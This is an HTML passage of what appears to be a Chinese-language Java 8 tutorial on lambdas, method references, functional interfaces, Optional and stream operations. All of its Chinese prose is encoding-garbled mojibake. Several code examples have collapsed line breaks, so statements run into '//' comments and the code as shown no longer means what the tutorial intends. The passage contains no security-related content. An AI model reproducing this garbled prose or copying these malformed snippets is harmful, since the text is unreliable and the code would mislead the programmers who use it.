class="token punctuation">></span></span> <span class="token punctuation">&#123;</span>    <span class="token class-name">P</span> <span class="token function">create</span><span class="token punctuation">(</span><span class="token class-name">String</span> firstName<span class="token punctuation">,</span> <span class="token class-name">String</span> lastName<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>æˆ‘ä»¬ä¸æ˜¯æ‰‹åŠ¨å®ç°å·¥å‚ï¼Œè€Œæ˜¯é€šè¿‡æ„é€ å‡½æ•°å¼•ç”¨å°†æ‰€æœ‰ä¸œè¥¿ç²˜åœ¨ä¸€èµ·:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">PersonFactory</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Person</span><span class="token punctuation">></span></span> personFactory <span class="token operator">=</span> <span class="token class-name">Person</span><span class="token operator">::</span><span class="token keyword">new</span><span class="token punctuation">;</span><span class="token class-name">Person</span> person <span class="token operator">=</span> personFactory<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token string">"Peter"</span><span class="token punctuation">,</span> <span class="token string">"Parker"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>é€šè¿‡<code>Person::new</code>åˆ›å»ºå¯¹Personæ„é€ å‡½æ•°çš„å¼•ç”¨ã€‚Javaç¼–è¯‘å™¨é€šè¿‡åŒ¹é…<code>PersonFactory.create</code>çš„ç­¾åè‡ªåŠ¨é€‰æ‹©æ­£ç¡®çš„æ„é€ å‡½æ•°ã€‚</p></div><h2 id="LambdaèŒƒå›´">LambdaèŒƒå›´</h2><div class="story post-story"><p>ä»lambdaè¡¨è¾¾å¼è®¿é—®å¤–éƒ¨ä½œç”¨åŸŸå˜é‡éå¸¸ç±»ä¼¼äºåŒ¿åå¯¹è±¡ã€‚æ‚¨å¯ä»¥ä»æœ¬åœ°å¤–éƒ¨ä½œç”¨åŸŸä»¥åŠå®ä¾‹å­—æ®µå’Œé™æ€å˜é‡è®¿é—®æœ€ç»ˆå˜é‡ã€‚</p><h3 id="è®¿é—®å±€éƒ¨å˜é‡">è®¿é—®å±€éƒ¨å˜é‡</h3><p>æˆ‘ä»¬å¯ä»¥ä»lambdaè¡¨è¾¾å¼çš„å¤–éƒ¨ä½œç”¨åŸŸè¯»å–æœ€ç»ˆå±€éƒ¨å˜é‡:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">final</span> <span class="token keyword">int</span> num <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token class-name">Converter</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> stringConverter <span class="token operator">=</span>        <span class="token punctuation">(</span>from<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>from <span class="token operator">+</span> num<span class="token punctuation">)</span><span class="token punctuation">;</span>stringConverter<span class="token punctuation">.</span><span class="token function">convert</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// 3</span></code></pre><p>ä½†ä¸åŒ¿åå¯¹è±¡ä¸åŒçš„æ˜¯ï¼Œå˜é‡<code>num</code>ä¸å¿…å£°æ˜ä¸ºfinalã€‚æ­¤ä»£ç ä¹Ÿæ˜¯æœ‰æ•ˆçš„:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> num <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token class-name">Converter</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> stringConverter <span class="token operator">=</span>        <span class="token punctuation">(</span>from<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>from <span class="token operator">+</span> num<span class="token punctuation">)</span><span class="token punctuation">;</span>stringConverter<span class="token punctuation">.</span><span class="token function">convert</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// 3</span></code></pre><p>ä½†æ˜¯<code>num</code>å¿…é¡»æ˜¯éšå¼çš„finalï¼Œæ‰èƒ½ç¼–è¯‘ä»£ç ã€‚ä»¥ä¸‹ä»£ç æ— æ³•ç¼–è¯‘:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> num <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token class-name">Converter</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> stringConverter <span class="token operator">=</span>        <span class="token punctuation">(</span>from<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>from <span class="token operator">+</span> num<span class="token punctuation">)</span><span class="token punctuation">;</span>num <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span></code></pre><p><strong>ä¹Ÿç¦æ­¢ä»lambdaè¡¨è¾¾å¼å†…å†™å…¥numã€‚</strong></p><h3 id="è®¿é—®å­—æ®µå’Œé™æ€å˜é‡">è®¿é—®å­—æ®µå’Œé™æ€å˜é‡</h3><p>ä¸å±€éƒ¨å˜é‡ç›¸æ¯”ï¼Œæˆ‘ä»¬å¯ä»¥ä»lambdaè¡¨è¾¾å¼ä¸­è¯»å†™å®ä¾‹å­—æ®µå’Œé™æ€å˜é‡ã€‚è¿™ç§è¡Œä¸ºåœ¨åŒ¿åå¯¹è±¡ä¸­å¾ˆå¸¸è§ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">Lambda4</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token keyword">int</span> outerStaticNum<span class="token punctuation">;</span>    <span class="token keyword">int</span> outerNum<span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token function">testScopes</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Converter</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> stringConverter1 <span class="token operator">=</span> <span class="token punctuation">(</span>from<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>            outerNum <span class="token operator">=</span> <span class="token number">23</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>from<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token class-name">Converter</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> stringConverter2 <span class="token operator">=</span> <span class="token punctuation">(</span>from<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>            outerStaticNum <span class="token operator">=</span> <span class="token number">72</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>from<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="è®¿é—®ç¼ºçœæ¥å£æ–¹æ³•">è®¿é—®ç¼ºçœæ¥å£æ–¹æ³•</h3><p>è¿˜è®°å¾—ç¬¬ä¸€éƒ¨åˆ†çš„å…¬å¼ä¾‹å­å—? æ¥å£<code>Formula</code>å®šä¹‰äº†ä¸€ä¸ªé»˜è®¤æ–¹æ³•<code>sqrt</code>ï¼Œå¯ä»¥ä»æ¯ä¸ªå…¬å¼å®ä¾‹(åŒ…æ‹¬åŒ¿åå¯¹è±¡)è®¿é—®è¯¥æ–¹æ³•ã€‚è¿™ä¸é€‚ç”¨äºlambdaè¡¨è¾¾å¼ã€‚</p><p><strong>ä¸èƒ½</strong>ä»lambdaè¡¨è¾¾å¼ä¸­è®¿é—®é»˜è®¤æ–¹æ³•ã€‚ä»¥ä¸‹ä»£ç æ— æ³•ç¼–è¯‘:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Formula</span> formula <span class="token operator">=</span> <span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token function">sqrt</span><span class="token punctuation">(</span> a <span class="token operator">*</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></div><h2 id="å†…ç½®å‡½æ•°å¼æ¥å£">å†…ç½®å‡½æ•°å¼æ¥å£</h2><div class="story post-story"><p>JDK 1.8 APIåŒ…å«è®¸å¤šå†…ç½®çš„åŠŸèƒ½æ€§æ¥å£ã€‚å®ƒä»¬ä¸­çš„ä¸€äº›åœ¨è¾ƒæ—©çš„Javaç‰ˆæœ¬ä¸­å¾ˆæœ‰åï¼Œæ¯”å¦‚<code>Comparator</code>æˆ–<code>Runnable</code>ã€‚é€šè¿‡<code>@FunctionalInterface</code>æ³¨é‡Šå¯¹è¿™äº›ç°æœ‰æ¥å£è¿›è¡Œäº†æ‰©å±•ï¼Œä»¥æ”¯æŒLambdaã€‚</p><p>ä½†æ˜¯Java 8 APIä¹Ÿå……æ»¡äº†æ–°çš„åŠŸèƒ½æ¥å£ï¼Œä½¿æ‚¨çš„ç”Ÿæ´»æ›´è½»æ¾ã€‚å…¶ä¸­ä¸€äº›æ–°æ¥å£æ¥è‡ª <a href="https://code.google.com/p/guava-libraries/">Google Guava</a>åº“ã€‚å³ä½¿æ‚¨ç†Ÿæ‚‰è¿™ä¸ªåº“ï¼Œä¹Ÿåº”è¯¥å¯†åˆ‡å…³æ³¨è¿™äº›æ¥å£æ˜¯å¦‚ä½•é€šè¿‡ä¸€äº›æœ‰ç”¨çš„æ–¹æ³•æ‰©å±•æ¥æ‰©å±•çš„ã€‚</p><h3 id="è°“è¯-Predicates">è°“è¯(Predicates)</h3><p>è°“è¯æ˜¯ä¸€ä¸ªå‚æ•°çš„å¸ƒå°”å€¼å‡½æ•°ã€‚è¯¥æ¥å£åŒ…å«ç”¨äºå°†è°“è¯ç»„åˆæˆå¤æ‚é€»è¾‘æœ¯è¯­(å’Œæˆ–å¦å®š)çš„å„ç§é»˜è®¤æ–¹æ³•ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Predicate</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> predicate <span class="token operator">=</span> <span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">-></span> s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span>predicate<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">"foo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment">// truepredicate.negate().test("foo");     // falsePredicate&lt;Boolean> nonNull = Objects::nonNull;Predicate&lt;Boolean> isNull = Objects::isNull;Predicate&lt;String> isEmpty = String::isEmpty;Predicate&lt;String> isNotEmpty = isEmpty.negate();</span></code></pre><h3 id="å‡½æ•°-Functions">å‡½æ•°(Functions)</h3><p>å‡½æ•°æ¥å—ä¸€ä¸ªå‚æ•°å¹¶äº§ç”Ÿä¸€ä¸ªç»“æœã€‚é»˜è®¤æ–¹æ³•å¯ä»¥ç”¨äºå°†å¤šä¸ªå‡½æ•°é“¾æ¥åœ¨ä¸€èµ·(compose, andThen)ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Function</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">></span></span> toInteger <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token operator">::</span><span class="token function">valueOf</span><span class="token punctuation">;</span><span class="token class-name">Function</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> backToString <span class="token operator">=</span> toInteger<span class="token punctuation">.</span><span class="token function">andThen</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token operator">::</span><span class="token function">valueOf</span><span class="token punctuation">)</span><span class="token punctuation">;</span>backToString<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token string">"123"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// "123"</span></code></pre><h3 id="suppliers">suppliers</h3><p>Suppliersç”Ÿæˆç»™å®šæ³›å‹ç±»å‹çš„ç»“æœã€‚ä¸å‡½æ•°ä¸åŒï¼Œ,Suppliersä¸æ¥å—å‚æ•°ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Supplier</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Person</span><span class="token punctuation">></span></span> personSupplier <span class="token operator">=</span> <span class="token class-name">Person</span><span class="token operator">::</span><span class="token keyword">new</span><span class="token punctuation">;</span>personSupplier<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// new Person</span></code></pre><h3 id="Consumers">Consumers</h3><p>æ¶ˆè´¹è€…è¡¨ç¤ºå¯¹å•ä¸ªè¾“å…¥å‚æ•°æ‰§è¡Œçš„æ“ä½œ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Consumer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Person</span><span class="token punctuation">></span></span> greeter <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Hello, "</span> <span class="token operator">+</span> p<span class="token punctuation">.</span>firstName<span class="token punctuation">)</span><span class="token punctuation">;</span>greeter<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"Luke"</span><span class="token punctuation">,</span> <span class="token string">"Skywalker"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="comparators">comparators</h3><p>æ¯”è¾ƒå™¨åœ¨è¾ƒæ—©çš„Javaç‰ˆæœ¬ä¸­å¾ˆæœ‰åã€‚Java 8å‘æ¥å£ä¸­æ·»åŠ äº†å„ç§é»˜è®¤æ–¹æ³•ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Comparator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Person</span><span class="token punctuation">></span></span> comparator <span class="token operator">=</span> <span class="token punctuation">(</span>p1<span class="token punctuation">,</span> p2<span class="token punctuation">)</span> <span class="token operator">-></span> p1<span class="token punctuation">.</span>firstName<span class="token punctuation">.</span><span class="token function">compareTo</span><span class="token punctuation">(</span>p2<span class="token punctuation">.</span>firstName<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Person</span> p1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"John"</span><span class="token punctuation">,</span> <span class="token string">"Doe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Person</span> p2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"Alice"</span><span class="token punctuation">,</span> <span class="token string">"Wonderland"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>comparator<span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span>p1<span class="token punctuation">,</span> p2<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment">// > 0comparator.reversed().compare(p1, p2);  // &lt; 0</span></code></pre><h3 id="Optionals">Optionals</h3><p>å¯é€‰å¯¹è±¡ä¸æ˜¯å‡½æ•°æ¥å£ï¼Œè€Œæ˜¯ä¸€ä¸ªé˜²æ­¢<code>NullPointerException</code>çš„æ¼‚äº®å®ç”¨å·¥å…·ã€‚è¿™æ˜¯ä¸‹ä¸€èŠ‚çš„ä¸€ä¸ªé‡è¦æ¦‚å¿µï¼Œæ‰€ä»¥è®©æˆ‘ä»¬å¿«é€Ÿäº†è§£ä¸€ä¸‹<code>optional</code>æ˜¯å¦‚ä½•å·¥ä½œçš„ã€‚</p><p><code>Optional</code>æ˜¯ä¸€ä¸ªç®€å•çš„å€¼å®¹å™¨ï¼Œå®ƒå¯ä»¥æ˜¯ç©ºå€¼æˆ–éç©ºå€¼ã€‚è€ƒè™‘ä¸€ä¸ªå¯èƒ½è¿”å›éç©ºç»“æœä½†æœ‰æ—¶ä»€ä¹ˆä¹Ÿä¸è¿”å›çš„æ–¹æ³•ã€‚åœ¨<code>Java 8</code>ä¸­ï¼Œä¸æ˜¯è¿”å›nullï¼Œè€Œæ˜¯è¿”å›ä¸€ä¸ªOptionalã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Optional</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> optional <span class="token operator">=</span> <span class="token class-name">Optional</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token string">"bam"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>optional<span class="token punctuation">.</span><span class="token function">isPresent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">// trueoptional.get();                 // "bam"optional.orElse("fallback");    // "bam"optional.ifPresent((s) -> System.out.println(s.charAt(0)));     // "b"</span></code></pre></div><h2 id="Streams">Streams</h2><div class="story post-story"><p><code>stream</code>è¡¨ç¤ºä¸€ä¸ªå¯ä»¥æ‰§è¡Œä¸€ä¸ªæˆ–å¤šä¸ªæ“ä½œçš„å…ƒç´ åºåˆ—ã€‚æµæ“ä½œå¯ä»¥æ˜¯ä¸­é—´æ“ä½œï¼Œä¹Ÿå¯ä»¥æ˜¯ç»ˆç«¯æ“ä½œã€‚ç»ˆç«¯æ“ä½œè¿”å›æŸç§ç±»å‹çš„ç»“æœï¼Œè€Œä¸­é—´æ“ä½œè¿”å›æµæœ¬èº«ï¼Œå› æ­¤æ‚¨å¯ä»¥åœ¨ä¸€è¡Œä¸­é“¾æ¥å¤šä¸ªæ–¹æ³•è°ƒç”¨ã€‚æµæ˜¯åœ¨æºæ–‡ä»¶ä¸Šåˆ›å»ºçš„ï¼Œä¾‹å¦‚<code>java.util.Collection</code>ï¼Œå¦‚åˆ—è¡¨æˆ–é›†åˆ(ä¸æ”¯æŒæ˜ å°„)ã€‚æµæ“ä½œå¯ä»¥é¡ºåºæ‰§è¡Œï¼Œä¹Ÿå¯ä»¥å¹¶è¡Œæ‰§è¡Œã€‚</p><p>è®©æˆ‘ä»¬é¦–å…ˆçœ‹çœ‹é¡ºåºæµæ˜¯å¦‚ä½•å·¥ä½œçš„ã€‚é¦–å…ˆï¼Œæˆ‘ä»¬ä»¥å­—ç¬¦ä¸²åˆ—è¡¨çš„å½¢å¼åˆ›å»ºä¸€ä¸ªç¤ºä¾‹æº:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> stringCollection <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>stringCollection<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"ddd2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>stringCollection<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"aaa2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>stringCollection<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"bbb1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>stringCollection<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"aaa1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>stringCollection<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"bbb3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>stringCollection<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"ccc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>stringCollection<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"bbb2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>stringCollection<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"ddd1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>Java 8ä¸­çš„é›†åˆè¢«æ‰©å±•äº†ï¼Œæ‰€ä»¥ä½ å¯ä»¥é€šè¿‡è°ƒç”¨<code>Collection.stream()</code>æˆ–<code>Collection.parallelStream()</code>ç®€å•åœ°åˆ›å»ºæµã€‚ä¸‹é¢çš„éƒ¨åˆ†è§£é‡Šäº†æœ€å¸¸è§çš„æµæ“ä½œã€‚</p><h3 id="Filter">Filter</h3><p>Filteræ¥å—ä¸€ä¸ªè°“è¯(predicate)æ¥è¿‡æ»¤æµä¸­çš„æ‰€æœ‰å…ƒç´ ã€‚è¿™ä¸ªæ“ä½œæ˜¯ä¸­é—´çš„ï¼Œå®ƒä½¿æˆ‘ä»¬èƒ½å¤Ÿå¯¹ç»“æœè°ƒç”¨å¦ä¸€ä¸ªæµæ“ä½œ(<code>forEach</code>)ã€‚ForEach æ¥å—è¦ä¸ºè¿‡æ»¤æµä¸­çš„æ¯ä¸ªå…ƒç´ æ‰§è¡Œçš„ä½¿ç”¨è€…ã€‚<code>ForEach</code>æ˜¯ä¸€ä¸ªç»ˆç«¯æ“ä½œã€‚å®ƒæ˜¯<code>void</code>çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½è°ƒç”¨å¦ä¸€ä¸ªæµæ“ä½œã€‚</p><pre class="language-java" data-language="java"><code class="language-java">stringCollection    <span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">-></span> s<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token operator">::</span><span class="token function">println</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// "aaa2", "aaa1"</span></code></pre><h3 id="Sorted">Sorted</h3><p><code>Sorted</code>æ˜¯ä¸€ä¸ªä¸­é—´æ“ä½œï¼Œå®ƒè¿”å›æµçš„æ’åºè§†å›¾ã€‚å…ƒç´ æŒ‰è‡ªç„¶é¡ºåºæ’åºï¼Œé™¤éä¼ é€’è‡ªå®šä¹‰<code>Comparator</code>ã€‚</p><pre class="language-java" data-language="java"><code class="language-java">stringCollection    <span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">sorted</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">-></span> s<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token operator">::</span><span class="token function">println</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// "aaa1", "aaa2"</span></code></pre><p>==è¯·è®°ä½ï¼Œsortedåªåˆ›å»ºæµçš„æ’åºè§†å›¾ï¼Œè€Œä¸æ“ä½œåå°é›†åˆçš„é¡ºåºã€‚<code>stringCollection</code>çš„é¡ºåºæ˜¯ä¸å˜çš„:==</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>stringCollection<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// ddd2, aaa2, bbb1, aaa1, bbb3, ccc, bbb2, ddd1</span></code></pre><h3 id="Map">Map</h3><p>ä¸­é—´æ“ä½œæ˜ å°„(Map)é€šè¿‡ç»™å®šçš„å‡½æ•°å°†æ¯ä¸ªå…ƒç´ è½¬æ¢ä¸ºå¦ä¸€ä¸ªå¯¹è±¡ã€‚ä¸‹é¢çš„ç¤ºä¾‹å°†æ¯ä¸ªå­—ç¬¦ä¸²è½¬æ¢ä¸ºå¤§å†™å­—ç¬¦ä¸²ã€‚ä½†æ˜¯æ‚¨ä¹Ÿå¯ä»¥ä½¿ç”¨<code>map</code>å°†æ¯ä¸ªå¯¹è±¡è½¬æ¢ä¸ºå¦ä¸€ç§ç±»å‹ã€‚ç»“æœæµçš„æ³›å‹ç±»å‹å–å†³äºä¼ é€’ç»™<code>map</code>çš„å‡½æ•°çš„æ³›å‹ç±»å‹ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// æ˜ å°„map ä»å°å†™å˜æˆå¤§å†™, å¹¶æŒ‰ç…§ä»å°åˆ°å¤§æ’åºstringCollection    .stream()    .map(String::toUpperCase)    .sorted((a, b) -> b.compareTo(a))    .forEach(System.out::println);// "DDD2", "DDD1", "CCC", "BBB3", "BBB2", "AAA2", "AAA1"</span></code></pre><h3 id="Match">Match</h3><p>å¯ä»¥ä½¿ç”¨å„ç§åŒ¹é…æ“ä½œæ¥æ£€æŸ¥æŸä¸ªè°“è¯æ˜¯å¦ä¸æµåŒ¹é…ã€‚æ‰€æœ‰è¿™äº›æ“ä½œéƒ½æ˜¯<code>terminal</code>ï¼Œå¹¶è¿”å›ä¸€ä¸ª<code>å¸ƒå°”ç»“æœ</code>ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// æ˜¯å¦æœ‰è‡³å°‘ä¸€ä¸ªä»¥aå¼€å¤´çš„å­˜åœ¨?boolean anyStartsWithA =    stringCollection        .stream()        .anyMatch((s) -> s.startsWith("a"));System.out.println(anyStartsWithA);      // true//æ˜¯å¦å…¨éƒ½æ˜¯ä»¥aå¼€å¤´?boolean allStartsWithA =    stringCollection        .stream()        .allMatch((s) -> s.startsWith("a"));System.out.println(allStartsWithA);      // false// æ˜¯å¦ä¸å­˜åœ¨ä»¥zå¼€å¤´?boolean noneStartsWithZ =    stringCollection        .stream()        .noneMatch((s) -> s.startsWith("z"));System.out.println(noneStartsWithZ);      // true</span></code></pre><h3 id="Count">Count</h3><p>Countæ˜¯ä¸€ä¸ªç»ˆç«¯æ“ä½œï¼Œå°†æµä¸­çš„å…ƒç´ ä¸ªæ•°ä½œä¸º<code>long</code>è¿”å›ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// ä»¥Bå¼€å¤´çš„ä¸ªæ•°long startsWithB =    stringCollection        .stream()        .filter((s) -> s.startsWith("b"))        .count();System.out.println(startsWithB);    // 3</span></code></pre><h3 id="Reduce">Reduce</h3><p>è¿™ä¸ªç»ˆç«¯æ“ä½œä½¿ç”¨ç»™å®šå‡½æ•°å¯¹æµä¸­çš„å…ƒç´ è¿›è¡Œè¿˜åŸã€‚ç»“æœæ˜¯ä¸€ä¸ª<code>å¯é€‰(Optional)</code>çš„ä¿å­˜å‡å°‘çš„å€¼ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Optional</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> reduced <span class="token operator">=</span>    stringCollection        <span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">sorted</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> s2<span class="token punctuation">)</span> <span class="token operator">-></span> s1 <span class="token operator">+</span> <span class="token string">"#"</span> <span class="token operator">+</span> s2<span class="token punctuation">)</span><span class="token punctuation">;</span>reduced<span class="token punctuation">.</span><span class="token function">ifPresent</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token operator">::</span><span class="token function">println</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// "aaa1#aaa2#bbb1#bbb2#bbb3#ccc#ddd1#ddd2"</span></code></pre></div><h2 